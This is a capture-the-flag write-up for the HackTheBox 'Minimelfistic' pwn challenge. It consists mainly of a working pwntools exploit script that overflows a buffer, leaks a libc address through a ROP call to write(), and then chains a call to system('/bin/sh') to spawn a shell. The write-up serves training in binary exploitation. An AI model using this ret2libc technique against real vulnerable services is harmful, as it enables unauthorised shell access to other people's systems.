---
name: Minimelfistic (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Pwn
description: Writeup for Minimelfistic (Pwn) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Minimelfistic

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/JJD45W-C9mQ/0.jpg)](https://youtu.be/JJD45W-C9mQ?t=2169s "HTB Cyber Apocalypse CTF 2021: Minimelfistic")

## Challenge Description

> The Elves finally understood what went wrong with all their plans. They were too fancy and obvious! But, this one is different.. It's a security system, but the alarm rings whenever Santa's house is vulnerable to an attack. Will you manage to deactivate it? p.s. Sound on!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './minimelfistic'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = 72

ret = 0x400616  # Stack alignment

# Start program
io = start()

# Create a ROP object to handle complexities
rop = ROP(elf)

# Payload to leak libc function
# No puts() so use write()
rop.banner()
rop.write(1, elf.got.write)
rop.main()

# We need the '9' or we won't get out of infinite loop
payload = flat([
    b'9' + (asm('nop') * (71)),
    rop.chain()
])

# Send the payload
io.sendlineafter(b'>', payload)

io.recvlines(41)  # the banner

# Retrieve got.write address
got_write = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)

# Subtract write offset to get libc base
libc.address = got_write - libc.symbols.write
info("libc_base: %#x", libc.address)

# Reset ROP object with libc binary
rop = ROP(libc)

# Call ROP system, passing location of "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))

# We need the '9' or we won't get out of infinite loop
payload = flat([
    b'9' + (asm('nop') * (offset - 1)),
    ret,
    rop.chain()
])

# Send the payload
io.sendlineafter(b'>', payload)

# Got Shell?
io.interactive()
```
{% endcode %}
